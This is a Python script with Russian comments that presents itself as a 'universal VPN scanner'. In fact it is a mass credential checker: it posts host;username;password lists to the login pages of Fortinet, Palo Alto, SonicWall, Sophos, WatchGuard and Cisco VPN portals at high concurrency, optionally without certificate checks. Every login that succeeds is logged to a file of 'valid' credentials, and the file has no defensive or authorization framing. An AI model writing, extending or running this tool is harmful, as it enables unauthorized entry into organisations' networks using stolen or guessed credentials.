#!/usr/bin/env python3
"""
Универсальный VPN сканер с поддержкой различных типов VPN
"""

import os
import sys
import json
import time
import random
import asyncio
import aiohttp
import argparse
import aiofiles
from pathlib import Path
from urllib.parse import quote_plus

# Аргументы командной строки
parser = argparse.ArgumentParser(description="Universal VPN Scanner")
parser.add_argument("--vpn-type", required=True, help="Тип VPN (fortinet, paloalto, sonicwall, sophos, watchguard, cisco)")
parser.add_argument("--creds-file", help="Файл с учетными данными")
parser.add_argument("--output", default="valid.txt", help="Файл для сохранения валидных учетных данных")
parser.add_argument("--threads", type=int, default=100, help="Количество потоков")
parser.add_argument("--timeout", type=int, default=10, help="Таймаут в секундах")
parser.add_argument("--verbose", action="store_true", help="Подробный вывод")
parser.add_argument("--insecure", action="store_true", help="Не проверять SSL сертификаты")
args = parser.parse_args()

# Проверка типа VPN
SUPPORTED_VPN_TYPES = ["fortinet", "paloalto", "sonicwall", "sophos", "watchguard", "cisco"]
if args.vpn_type not in SUPPORTED_VPN_TYPES:
    print(f"❌ Неподдерживаемый тип VPN: {args.vpn_type}")
    print(f"Поддерживаемые типы: {', '.join(SUPPORTED_VPN_TYPES)}")
    sys.exit(1)

# Загрузка учетных данных
creds_file = args.creds_file
if not creds_file:
    creds_file = f"creds/{args.vpn_type}.txt"

if not os.path.exists(creds_file):
    print(f"❌ Файл с учетными данными не найден: {creds_file}")
    sys.exit(1)

with open(creds_file, "r") as f:
    credentials = [line.strip() for line in f if line.strip() and not line.startswith("#")]

# Статистика
stats = {
    "goods": 0,
    "bads": 0,
    "errors": 0,
    "offline": 0,
    "ipblock": 0,
    "processed": 0,
    "rps": 0
}

# Файл для статистики
stats_file = f"stats_{os.getpid()}.json"

# Семафор для ограничения числа одновременных запросов
semaphore = asyncio.Semaphore(args.threads)

# Индикаторы успешной аутентификации для разных типов VPN
SUCCESS_INDICATORS = {
    "fortinet": [
        "vpn/tunnel",
        "/remote/fortisslvpn",
        "tunnel_mode",
        "sslvpn_login",
        "forticlient_download",
        "portal.html",
        "welcome.html",
        "fgt_lang",
        "FortiGate",
        "sslvpn_portal",
        "logout",
        "dashboard",
        "web_access",
        "tunnel_access"
    ],
    "paloalto": [
        "Download Windows 64 bit GlobalProtect agent",
        "globalprotect/portal/css",
        "portal-userauthcookie",
        "GlobalProtect Portal",
        "gp-portal",
        "/global-protect/portal",
        "PanGlobalProtect",
        "clientDownload",
        "hip-report",
        "portal-config",
        "gateway-config",
        "logout",
        "welcome"
    ],
    "sonicwall": [
        "SonicWall",
        "NetExtender",
        "sslvpn",
        "portal.html",
        "welcome",
        "logout",
        "dashboard",
        "tunnel",
        "vpn-client"
    ],
    "sophos": [
        "Sophos",
        "userportal",
        "myaccount",
        "welcome",
        "logout",
        "portal",
        "dashboard",
        "vpn-client",
        "tunnel"
    ],
    "watchguard": [
        "WatchGuard",
        "Firebox",
        "portal",
        "welcome",
        "logout",
        "AuthPoint",
        "dashboard",
        "tunnel",
        "vpn-client"
    ],
    "cisco": [
        "SSL VPN Service",
        "webvpn_logout",
        "/+CSCOE+/",
        "webvpn_portal",
        "Cisco Systems VPN Client",
        "/+webvpn+/",
        "anyconnect",
        "ANYCONNECT",
        "remote_access"
    ]
}

# Функции для проверки разных типов VPN
async def check_fortinet(session, ip, username, password, verify_ssl=True):
    """Проверка Fortinet VPN"""
    if not ip.startswith("http"):
        ip = f"https://{ip}"
    
    if not ip.endswith("/remote/login"):
        if ip.endswith("/"):
            ip += "remote/login"
        else:
            ip += "/remote/login"
    
    data = {
        "username": username,
        "password": password
    }
    
    try:
        async with semaphore:
            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["fortinet"]:
                        if indicator in text:
                            return True
                
                # Проверка на редирект
                if response.status in (301, 302):
                    location = response.headers.get("Location", "")
                    if any(x in location for x in ["portal", "tunnel", "sslvpn", "welcome", "dashboard"]):
                        return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def check_paloalto(session, ip, username, password, verify_ssl=True):
    """Проверка PaloAlto GlobalProtect VPN"""
    if not ip.startswith("http"):
        ip = f"https://{ip}"
    
    if not ip.endswith("/global-protect/login.esp"):
        if ip.endswith("/"):
            ip += "global-protect/login.esp"
        else:
            ip += "/global-protect/login.esp"
    
    data = {
        "prot": "https%",
        "server": ip.split("//")[1].split("/")[0],
        "inputStr": "",
        "action": "getsoftware",
        "user": username,
        "passwd": password,
        "ok": "Log In"
    }
    
    try:
        async with semaphore:
            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["paloalto"]:
                        if indicator in text:
                            return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def check_sonicwall(session, ip, username, password, domain="", verify_ssl=True):
    """Проверка SonicWall VPN"""
    if not ip.startswith("http"):
        ip = f"https://{ip}"
    
    if not ip.endswith("/auth.html"):
        if ip.endswith("/"):
            ip += "auth.html"
        else:
            ip += "/auth.html"
    
    data = {
        "username": username,
        "password": password,
        "domain": domain,
        "login": "Login"
    }
    
    try:
        async with semaphore:
            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["sonicwall"]:
                        if indicator in text:
                            return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def check_sophos(session, ip, username, password, domain="", verify_ssl=True):
    """Проверка Sophos VPN"""
    if not ip.startswith("http"):
        ip = f"https://{ip}"
    
    if not ip.endswith("/userportal/webpages/myaccount/login.jsp"):
        if ip.endswith("/"):
            ip += "userportal/webpages/myaccount/login.jsp"
        else:
            ip += "/userportal/webpages/myaccount/login.jsp"
    
    data = {
        "username": username,
        "password": password,
        "domain": domain,
        "loginBtn": "Login"
    }
    
    try:
        async with semaphore:
            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["sophos"]:
                        if indicator in text:
                            return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def check_watchguard(session, ip, username, password, verify_ssl=True):
    """Проверка WatchGuard VPN"""
    # Формат WatchGuard: https://ip:port:Firebox-DB:domain:user:pass
    parts = ip.split(":")
    if len(parts) < 6:
        raise ValueError("Invalid WatchGuard format")
    
    ip_port = parts[0] + ":" + parts[1] + ":" + parts[2]
    auth_type = parts[3]
    domain = parts[4]
    username = parts[5]
    password = parts[6] if len(parts) > 6 else password
    
    if not ip_port.startswith("http"):
        ip_port = f"https://{ip_port}"
    
    if not ip_port.endswith("/auth.fcc"):
        if ip_port.endswith("/"):
            ip_port += "auth.fcc"
        else:
            ip_port += "/auth.fcc"
    
    data = {
        "domain": domain,
        "username": username,
        "password": password,
        "authType": auth_type,
        "login": "Login"
    }
    
    try:
        async with semaphore:
            async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["watchguard"]:
                        if indicator in text:
                            return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def check_cisco(session, ip, username, password, group="", verify_ssl=True):
    """Проверка Cisco ASA VPN"""
    # Формат Cisco: https://ip:port:user:pass:group (group optional)
    parts = ip.split(":")
    if len(parts) < 4:
        raise ValueError("Invalid Cisco format")
    
    ip_port = parts[0] + ":" + parts[1]
    username = parts[2]
    password = parts[3]
    group = parts[4] if len(parts) > 4 else group
    
    if not ip_port.startswith("http"):
        ip_port = f"https://{ip_port}"
    
    if not ip_port.endswith("/+webvpn+/index.html"):
        if ip_port.endswith("/"):
            ip_port += "+webvpn+/index.html"
        else:
            ip_port += "/+webvpn+/index.html"
    
    data = {
        "username": username,
        "password": password,
        "group_list": group,
        "Login": "Logon"
    }
    
    try:
        async with semaphore:
            async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                text = await response.text()
                
                # Проверка на успешную аутентификацию
                if response.status == 200:
                    for indicator in SUCCESS_INDICATORS["cisco"]:
                        if indicator in text:
                            return True
                
                return False
    except asyncio.TimeoutError:
        raise TimeoutError("Connection timeout")
    except Exception as e:
        raise Exception(f"Error: {str(e)}")

async def process_credential(session, cred, valid_file):
    """Обработка одной учетной записи"""
    parts = cred.split(";")
    
    try:
        verify_ssl = not args.insecure

        if args.vpn_type == "fortinet":
            if len(parts) < 3:
                raise ValueError("Invalid credential format")
            ip, username, password = parts[0], parts[1], parts[2]
            result = await check_fortinet(session, ip, username, password, verify_ssl)
        
        elif args.vpn_type == "paloalto":
            if len(parts) < 3:
                raise ValueError("Invalid credential format")
            ip, username, password = parts[0], parts[1], parts[2]
            result = await check_paloalto(session, ip, username, password, verify_ssl)
        
        elif args.vpn_type == "sonicwall":
            if len(parts) < 3:
                raise ValueError("Invalid credential format")
            ip, username, password = parts[0], parts[1], parts[2]
            domain = parts[3] if len(parts) > 3 else ""
            result = await check_sonicwall(session, ip, username, password, domain, verify_ssl)
        
        elif args.vpn_type == "sophos":
            if len(parts) < 3:
                raise ValueError("Invalid credential format")
            ip, username, password = parts[0], parts[1], parts[2]
            domain = parts[3] if len(parts) > 3 else ""
            result = await check_sophos(session, ip, username, password, domain, verify_ssl)
        
        elif args.vpn_type == "watchguard":
            # Специальный формат для WatchGuard
            result = await check_watchguard(session, cred, "", "", verify_ssl)
        
        elif args.vpn_type == "cisco":
            # Специальный формат для Cisco
            result = await check_cisco(session, cred, "", "", verify_ssl)
        
        else:
            raise ValueError(f"Unsupported VPN type: {args.vpn_type}")
        
        if result:
            stats["goods"] += 1
            async with aiofiles.open(valid_file, "a") as f:
                await f.write(f"{cred}\n")
            if args.verbose:
                print(f"✅ VALID: {cred}")
        else:
            stats["bads"] += 1
            if args.verbose:
                print(f"❌ INVALID: {cred}")
        
        stats["processed"] += 1
        
    except TimeoutError:
        stats["offline"] += 1
        stats["processed"] += 1
        if args.verbose:
            print(f"⏰ TIMEOUT: {cred}")
    
    except Exception as e:
        stats["errors"] += 1
        stats["processed"] += 1
        if args.verbose:
            print(f"❌ ERROR: {cred} - {str(e)}")

async def update_stats():
    """Периодическое обновление статистики"""
    while True:
        # Обновляем RPS
        elapsed = time.time() - start_time
        if elapsed > 0:
            stats["rps"] = stats["processed"] / elapsed
        
        # Записываем статистику в файл
        with open(stats_file, "w") as f:
            json.dump(stats, f)
        
        # Выводим текущую статистику
        print(f"\r🔥 G:{stats['goods']} B:{stats['bads']} E:{stats['errors']} "
              f"Off:{stats['offline']} Blk:{stats['ipblock']} | "
              f"⚡{stats['rps']:.1f}/s | ⏱️{int(elapsed)}s", end="")
        
        await asyncio.sleep(1)

async def main():
    """Основная функция сканера"""
    global start_time
    
    print(f"🚀 Запуск сканера {args.vpn_type.upper()}")
    print(f"📊 Загружено {len(credentials)} учетных данных")
    print(f"⚙️ Потоков: {args.threads}, Таймаут: {args.timeout}s")
    
    # Создаем HTTP сессию
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    conn = aiohttp.TCPConnector(limit=args.threads, ssl=False if args.insecure else None)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
        # Запускаем задачу обновления статистики
        stats_task = asyncio.create_task(update_stats())
        
        # Запускаем задачи проверки учетных данных
        tasks = []
        for cred in credentials:
            task = asyncio.create_task(process_credential(session, cred, args.output))
            tasks.append(task)
        
        # Ждем завершения всех задач
        await asyncio.gather(*tasks)
        
        # Отменяем задачу обновления статистики
        stats_task.cancel()
        try:
            await stats_task
        except asyncio.CancelledError:
            pass
    
    # Финальное обновление статистики
    with open(stats_file, "w") as f:
        json.dump(stats, f)
    
    print("\n✅ Сканирование завершено!")
    print(f"📊 Результаты: G:{stats['goods']} B:{stats['bads']} E:{stats['errors']} "
          f"Off:{stats['offline']} Blk:{stats['ipblock']}")
    print(f"💾 Валидные учетные данные сохранены в {args.output}")

# Запуск сканера
if __name__ == "__main__":
    start_time = time.time()
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Сканирование прервано пользователем")
        
        # Финальное обновление статистики
        with open(stats_file, "w") as f:
            json.dump(stats, f)
